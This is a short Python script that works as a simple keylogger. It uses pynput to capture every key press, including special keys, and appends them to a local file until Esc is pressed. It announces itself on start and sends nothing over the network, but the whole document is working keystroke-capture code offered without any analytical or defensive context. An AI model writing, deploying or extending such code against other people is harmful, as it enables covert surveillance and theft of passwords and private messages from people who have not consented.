from pynput.keyboard import Key, Listener

def on_press(key):
    try:
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        # Handle special keys
        with open("keylog.txt", "a") as log_file:
            log_file.write(f"[{key}]")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

if __name__ == "__main__":
    print("Simple Keylogger is running. Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
